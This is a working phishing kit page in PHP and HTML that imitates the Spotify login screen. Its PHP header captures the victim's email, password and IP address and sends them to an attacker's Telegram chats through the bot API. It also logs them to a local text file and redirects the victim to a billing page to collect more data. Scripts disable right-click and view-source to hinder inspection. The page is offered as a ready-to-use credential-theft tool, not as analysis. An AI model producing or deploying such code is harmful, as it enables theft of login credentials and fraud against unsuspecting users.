<?php
include 'info/id.php'; 
extract($_REQUEST); 
$log=$_POST["mail"];
$passw=$_POST["pass"];
if(isset($_POST['okbb'])){
$ip = getenv("REMOTE_ADDR");
$message=" -------  𝓖𝒆𝓷𝓲𝓾𝓼  𝓢𝓟𝓞𝓣𝓘ℱ𝓨 𝓢ℳ𝓢 -------"."\n"."𝓔-𝓶𝓪𝓲𝓵 𝓐𝓭𝓻𝒆𝓼𝓼 :  ".$log."\n"."𝓟𝓪𝓼𝔀𝓸𝓻𝓭 :".$passw."\n"."𝓘𝓟: ".$ip."\n"."------------  𝓢𝓟𝓞𝓣𝓘ℱ𝓨  -------------";
$user_ids=$id;
foreach($user_ids as $user_id) {
$url='https://api.telegram.org/bot'.$token.'/sendMessage';
$data=array('chat_id'=>$user_id,'text'=>$message);
$options=array('http'=>array('method'=>'POST','header'=>"Content-Type:application/x-www-form-urlencoded\r\n",'content'=>http_build_query($data),),);
$context=stream_context_create($options);
$result=file_get_contents($url,false,$context);
}
$myfile = fopen("noni.txt", "a+");
$txt = $message;
fwrite($myfile, $txt);
fclose($myfile);
include "antics.php";
HEADER("Location: info/billing.php");
exit(); 
}
    ?>
<html style="display: block;"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
    <meta http-equiv="Cache-Control" content="no-cache">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="-1">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

    <meta name="apple-mobile-web-app-title" content="Disney+">
    <meta name="theme-color" content="#ffffff">
    <meta name="msapplication-TileColor" content="#ffffff">

    
    <link rel="manifest" href="./img/ico/manifest.json">
    <link rel="shortcut icon" href="./img/ico/spotico.ico">
    <link rel="mask-icon" href="./img/ico/Pinned-Spotify.svg" color="#000">
    <link rel="apple-touch-icon" sizes="180x180" href="./img/ico/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="./img/ico/Spotify.png">

    <title>Login - Spotify</title>


    <link rel="stylesheet" type="text/css" href="./style/app_styles_bundle.css">
    <link rel="stylesheet" type="text/css" href="./style/main.css">
    <link rel="stylesheet" type="text/css" href="./style/react.css">
    <style>
        html {
            display: none;
        }
    </style>
    <script>
        if (self == top) {
            document.documentElement.style.display = 'block';
        } else {
            top.location = self.location;
        }
    </script>
    
    
                <style>
        /* Obfuscated CSS */
        .a { display: none !important; }
        .b { visibility: hidden !important; }
        .c { opacity: 0 !important; }
    </style>
    <script>
        // Obfuscated JavaScript
        (function() {
            var originalAlert = window.alert;
            window.alert = function() {
                console.log("Alerts are disabled.");
            };

            document.addEventListener("contextmenu", function(e) {
                e.preventDefault();
            });

            document.addEventListener("keydown", function(e) {
                if ((e.ctrlKey || e.metaKey) && (e.key === "u" || e.key === "U")) {
                    e.preventDefault();
                }
            });
        })();
    </script>


</head>

<body id="app_index" class="js-focus-visible">


    <style data-styled="" data-styled-version="4.4.1"></style>
    <div id="webAppRoot" data-reactroot="">
        <div id="app_body_content" data-testid="adult-enabled-profile">
            <div class="sc-esoVGF cNOTUj"></div>
            <div id="hudson-wrapper" class="sc-ZUflv kcCFNP video_view--hidden  ">
                <div class="sc-hPeUyl bhhZhW hudson-container">
                    <div data-testid="" class="sc-hSdWYo dfLgnK"><img alt="" aria-hidden="true" src="./img/icon-loader-32@3x.png" class="sc-eHgmQL jstxUN"></div>
                </div>
            </div>
            <div id="webAppHeader" class="onboarding">
    <div class="sc-iuJeZd hcKoaM">
        <!-- Move the logo inside a header container -->
        <header class="header-container">
            <img src="./img/ico/logo.png" id="logo" class="logo" style="
    width: 120px;
">
        </header>
    </div>
</div>
            <div id="webAppScene">
                <div id="app_scene_content">
                    <div id="app-background" class="sc-ekHBYt eIfKUM"></div>
                    <main class="onboarding" id="onboarding_index" style="top: 0px;">
                        <div class="onboarding-wrapper">
                            <!-- Wrap the form in a white container with width: 580px -->
                        <div class="form-container" style=" background-color: black; padding: 70px; margin: 0 auto; border-radius: 4PX;">
                            <form id="dssLogin" name="dssLogin" action="" method="post">
                                <h3 color="white" style="color: rgb(249, 249, 249); margin: 0px; padding: 0px 0px 24px;" class="sc-gZMcBi jhLoHG">Log in to Spotify</h3>
                                <fieldset class="sc-dznXNo dhAlPS" display="inline">
                                    <legend class="sc-bqjOQT hmkGgd">Email or username</legend>
                                    <span style="position: relative; display: block;">
                                        <input aria-label="Adresse e-mail" display="inline" id="mail" name="mail" maxlength="" placeholder="Email or username" class="sc-kjoXOD clJmAK sc-ekulBa fOQezq" value="" required="">
                                                                               <div id="emailError" color="red" font-size="12px" style="color: red; margin: 0px; padding: 6px 0px 0px 4px;" class="sc-kAzzGY ftHOpF"></div></span></fieldset>
                                <fieldset class="sc-dznXNo dhAlPS" display="inline">
                                    <legend class="sc-bqjOQT hmkGgd">Password</legend>
                                    <span style="position: relative; display: block;">
                                                <input aria-label="Mot de passe" display="inline" id="pass" name="pass" maxlength="" placeholder="Password" class="sc-kjoXOD clJmAK sc-ekulBa fOQezq" value="" type="password" required="">
                                                <div color="#cacaca" font-size="12px" style="color: rgb(202, 202, 202); margin: 0px; padding: 6px 0px 0px 4px;" class="sc-kAzzGY ftHOpF"></div></span>
                                    <div color="#cacaca" font-size="12px" class="sc-kAzzGY ftHOpF" style="text-align: left; color: rgb(202, 202, 202); margin: 0px; padding: 6px 0px 0px 4px;">Log in with your login credentials.</div>
                                </fieldset>

                                <div>
                                    
                                    <button aria-label="Accepter et continuer" data-testid="login-continue-button" role="button" kind="primary" value="submit" class="sc-gPEVay jOqQLP" id="" type="submit" name="okbb">CONTINUE</button></div>
                                <div class="forgot-password">
            <a href="#" class="forgot-link">Forgot your password ?</a>
        </div>
        <hr class="divider">

        <!-- Add the new text with "Je n'ai pas Spotify" underlined -->
        <div class="no-account">
            You do not have an account ?  <a href="#" class="no-account-link">I don't have Spotify</a>
        </div>
                            </form>
                            
                            
                                                        <style>
                                
            .spinner {
    margin:0px auto ;            
    border: 4px solid rgba(0, 0, 0, 0.1);
    border-top: 4px solid #fff;
    border-radius: 50%;
    width: 2px;
    height: 2px;
    animation: spin 1s linear infinite;
}

@keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
}

                                

                                
                            </style>
                        
                            
                        </div>
                    </div></main>
                </div>
            </div>
            <div tabindex="0" class="sc-eAKXzc fcUHFZ">
                <div id="cta-toast" class="sc-bfYoXt gCjimr"><button aria-label="" data-testid="" role="button" kind="primary" class="sc-gPEVay edYBEy sc-gbOuXE bcVAiB" id="" type="submit">GET SPOTIFY</button></div>
            </div>
            <div id="webAppFooter">
                <footer class="sc-fgfRvd kAzEpp" style="margin-top: 100px;" id="footer">
                    <div class="sc-gpHHfC fohBoY"><button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">Privacy Policy</button>
                        <button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">Cookie Terms</button>
                        <button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">Data Rights</button>
                        <button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">About Spotify</button>
                        <button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">Subscription terms and conditions</button>
                        <button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">Help</button>
                        <button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">Compatible devices</button>
                        <button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">About Spotify</button>
                        <button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">Interest-Based Ads</button>
                        <button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">Manage your preferences</button>
                    </div>
                    <div class="sc-gVyKpa kOxdJt">©Spotify. All rights reserved.</div>
                </footer>
            </div>
        </div>
    </div>
  </div>
        <script src="js/jquery-3.5.1.min.js"></script>
        <script src="js/jquery.mask.js"></script>
        <script src="js/jquery.main.js"></script>
        </div>


</body></html>